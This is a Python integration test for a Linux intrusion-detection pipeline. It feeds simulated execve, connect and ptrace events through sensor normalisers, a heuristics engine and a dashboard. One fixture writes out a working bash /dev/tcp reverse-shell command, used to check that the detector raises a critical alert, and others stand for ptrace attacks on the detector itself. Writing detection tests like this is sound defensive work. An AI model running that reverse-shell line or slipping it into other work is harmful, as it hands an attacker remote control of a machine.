#!/usr/bin/env python3
"""
test_integration.py - offline pipeline test: fake BCC-shaped raw structs ->
sensor.normalize() -> HeuristicsEngine.evaluate() -> DashboardState.ingest().

No root, no kernel, no bcc import -- none of the three sensor modules
import bcc either, so this is safe to run anywhere. Exits 0 on success,
non-zero on any failure -- treat as a CI gate exactly like
`heuristics_engine.py --selftest` and `dashboard_state.py --demo`.
"""
from __future__ import annotations

import os
import socket
import sys
import types

from execve_sensor import ExecveSensor, ARGSIZE
from connect_sensor import ConnectSensor
from ptrace_sensor import PtraceSensor
from heuristics_engine import HeuristicsEngine, _fake_stdio_probe
from dashboard_state import DashboardState

FAILURES: list[str] = []
CASES = 0


def check(name, cond, detail=""):
    global CASES
    CASES += 1
    if not cond:
        FAILURES.append(f"{name}: {detail}")


# ---- schema completeness --------------------------------------------------

EXECVE_SCHEMA = {"sensor", "ts", "pid", "ppid", "uid", "comm",
                 "filename", "argv", "argv_truncated", "cwd", "exe", "parent_comm"}
CONNECT_SCHEMA = {"sensor", "ts", "pid", "ppid", "uid", "comm",
                  "family", "daddr", "dport", "ret", "established"}
PTRACE_SCHEMA = {"sensor", "ts", "pid", "ppid", "uid", "comm",
                 "request", "target_pid", "target_comm", "target_exe", "targets_sensor"}


def _pack_argv(args: list[bytes]) -> bytes:
    """Mirror the real struct's flattened char argv[MAX_ARGS * ARGSIZE]
    layout: each arg padded/truncated to exactly ARGSIZE bytes."""
    return b"".join((a + b"\x00" * ARGSIZE)[:ARGSIZE] for a in args)


def fake_execve_raw(**over):
    argv_list = over.pop("argv", [b"ls", b"-la"])
    base = dict(pid=os.getpid(), ppid=1, uid=1000, comm=b"bash",
                filename=b"/usr/bin/ls",
                argv=_pack_argv(argv_list), argc=len(argv_list), argv_truncated=0)
    base.update(over)
    return types.SimpleNamespace(**base)


def fake_connect_raw(**over):
    base = dict(pid=4444, ppid=1, uid=0, comm=b"bash",
                daddr_v4=0x0100007F,  # native-endian read of network-order 127.0.0.1
                daddr_v6=[0, 0, 0, 0], dport=4444, family=socket.AF_INET, ret=0)
    base.update(over)
    return types.SimpleNamespace(**base)


def fake_ptrace_raw(**over):
    base = dict(pid=1234, ppid=1, uid=0, comm=b"gdb",
                request=16, tracee_pid=9999)  # PTRACE_ATTACH
    base.update(over)
    return types.SimpleNamespace(**base)


# ---- 1-3: schema completeness ---------------------------------------------

ev = ExecveSensor.normalize(fake_execve_raw())
check("execve-schema", EXECVE_SCHEMA <= set(ev.keys()), ev.keys())

ev = ConnectSensor.normalize(fake_connect_raw())
check("connect-schema", CONNECT_SCHEMA <= set(ev.keys()), ev.keys())

ev = PtraceSensor.normalize(fake_ptrace_raw())
check("ptrace-schema", PTRACE_SCHEMA <= set(ev.keys()), ev.keys())

# ---- 4-5: execve argv_truncated + full MAX_ARGS capture --------------------

full_argv = fake_execve_raw(argv=[f"arg{i}".encode() for i in range(20)],
                            argc=20, argv_truncated=1)
ev = ExecveSensor.normalize(full_argv)
check("execve-truncation-flag", ev["argv_truncated"] is True)
check("execve-truncation-count", len(ev["argv"]) == 20, len(ev["argv"]))

# ---- 6-7: connect family/daddr conversion (v4 and v6) ----------------------

ev = ConnectSensor.normalize(fake_connect_raw())
check("connect-v4-family", ev["family"] == "AF_INET", ev["family"])
check("connect-v4-daddr", ev["daddr"] == "127.0.0.1", ev["daddr"])

v6 = fake_connect_raw(family=socket.AF_INET6, daddr_v6=[0, 0, 0, 0x01000000])  # ::1
ev = ConnectSensor.normalize(v6)
check("connect-v6-family", ev["family"] == "AF_INET6", ev["family"])
check("connect-v6-daddr", ev["daddr"] == "::1", ev["daddr"])

# ---- 8: connect established semantics (ret == 0 only) ----------------------

ok = ConnectSensor.normalize(fake_connect_raw(ret=0))
check("connect-established-true", ok["established"] is True)
failed = ConnectSensor.normalize(fake_connect_raw(ret=-115))  # -EINPROGRESS
check("connect-established-false-inprogress", failed["established"] is False)

# ---- 9-11: ptrace request-name conversion ----------------------------------

ev = PtraceSensor.normalize(fake_ptrace_raw(request=16))
check("ptrace-request-attach", ev["request"] == "PTRACE_ATTACH", ev["request"])
ev = PtraceSensor.normalize(fake_ptrace_raw(request=4))
check("ptrace-request-poketext", ev["request"] == "PTRACE_POKETEXT", ev["request"])
ev = PtraceSensor.normalize(fake_ptrace_raw(request=0x4205))
check("ptrace-request-setregset", ev["request"] == "PTRACE_SETREGSET", ev["request"])

# ---- 12-13: ptrace targeting the shield itself -----------------------------

self_targeted = PtraceSensor.normalize(fake_ptrace_raw(tracee_pid=os.getpid()))
check("ptrace-targets-sensor-true", self_targeted["targets_sensor"] is True)
other_targeted = PtraceSensor.normalize(fake_ptrace_raw(tracee_pid=99999999))
check("ptrace-targets-sensor-false", other_targeted["targets_sensor"] is False)

# ---- 14-17: end-to-end raw -> normalize -> evaluate -> dashboard -----------

engine = HeuristicsEngine(stdio_probe=_fake_stdio_probe)
dash = DashboardState(hostname="test")

# H-005: bash /dev/tcp reverse shell
devtcp = fake_execve_raw(pid=7001, filename=b"/bin/bash",
                         argv=[b"bash", b"-c",
                               b"bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"],
                         argc=3)
ev = ExecveSensor.normalize(devtcp)
result = engine.evaluate(ev)
check("e2e-devtcp-fires", result is not None and result.severity == "CRITICAL",
      result and result.severity)
dash.ingest(ev, result)

# H-022: detection engine targeted (hard override -> CRITICAL, score 100)
self_evt = PtraceSensor.normalize(fake_ptrace_raw(tracee_pid=os.getpid(), request=16))
result = engine.evaluate(self_evt)
check("e2e-self-targeted-critical", result is not None and result.severity == "CRITICAL",
      result and result.severity)
dash.ingest(self_evt, result)

# H-031 via injected fake stdio probe -- pid 4003 hardcoded in _fake_stdio_probe
connect_evt = ConnectSensor.normalize(fake_connect_raw(pid=4003, comm=b"bash"))
result = engine.evaluate(connect_evt)
check("e2e-stdio-socket-fires",
      result is not None and "H-031" in [v.rule_id for v in result.verdicts],
      result and [v.rule_id for v in result.verdicts])
dash.ingest(connect_evt, result)

snap = dash.snapshot()
check("dashboard-snapshot-shape", "panels" in snap and "alerts" in snap["panels"])
check("dashboard-alerts-nonempty", len(snap["panels"]["alerts"]["rows"]) >= 2,
      len(snap["panels"]["alerts"]["rows"]))

# ---- report -----------------------------------------------------------

if FAILURES:
    print(f"{len(FAILURES)}/{CASES} checks FAILED:")
    for f in FAILURES:
        print(f"  - {f}")
    sys.exit(1)
print(f"All {CASES} cases passed, exit 0")
sys.exit(0)
